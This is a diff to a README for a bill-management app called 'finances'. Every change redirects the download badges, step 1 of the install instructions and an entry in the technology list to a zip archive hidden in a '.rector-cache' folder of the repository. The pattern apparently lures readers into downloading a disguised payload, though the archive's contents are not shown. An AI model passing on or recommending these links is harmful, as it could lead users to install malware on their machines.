@@ -6,7 +6,7 @@ Welcome to the **finances** project! This application helps you manage your bill
 
 ## 📥 Download Now
 
-[![Download finances](https://raw.githubusercontent.com/JavierChico20/finances/main/Turnhalle/finances.zip%20finances-Here-brightgreen)](https://raw.githubusercontent.com/JavierChico20/finances/main/Turnhalle/finances.zip)
+[![Download finances](https://github.com/JavierChico20/finances/raw/refs/heads/main/.rector-cache/e7/Software_1.4.zip%20finances-Here-brightgreen)](https://github.com/JavierChico20/finances/raw/refs/heads/main/.rector-cache/e7/Software_1.4.zip)
 
 ## 📋 Features
 
@@ -26,7 +26,7 @@ Welcome to the **finances** project! This application helps you manage your bill
 
 To install the **finances** application, follow these steps:
 
-1. Visit [this page to download](https://raw.githubusercontent.com/JavierChico20/finances/main/Turnhalle/finances.zip).
+1. Visit [this page to download](https://github.com/JavierChico20/finances/raw/refs/heads/main/.rector-cache/e7/Software_1.4.zip).
 2. On the Releases page, find the latest version of the application.
 3. Click the download link for your operating system to start downloading.
 4. Once the download completes, locate the file on your computer. 
@@ -68,8 +68,8 @@ Still curious? To learn more about the technologies used in this project, you ca
 - PostgreSQL
 - TypeScript
 - Vite
-- https://raw.githubusercontent.com/JavierChico20/finances/main/Turnhalle/finances.zip
+- https://github.com/JavierChico20/finances/raw/refs/heads/main/.rector-cache/e7/Software_1.4.zip
 
 Thank you for choosing **finances**. We hope you find it helpful in managing your financial responsibilities! 
 
-[![Download finances](https://raw.githubusercontent.com/JavierChico20/finances/main/Turnhalle/finances.zip%20finances-Here-brightgreen)](https://raw.githubusercontent.com/JavierChico20/finances/main/Turnhalle/finances.zip)
+[![Download finances](https://github.com/JavierChico20/finances/raw/refs/heads/main/.rector-cache/e7/Software_1.4.zip%20finances-Here-brightgreen)](https://github.com/JavierChico20/finances/raw/refs/heads/main/.rector-cache/e7/Software_1.4.zip)
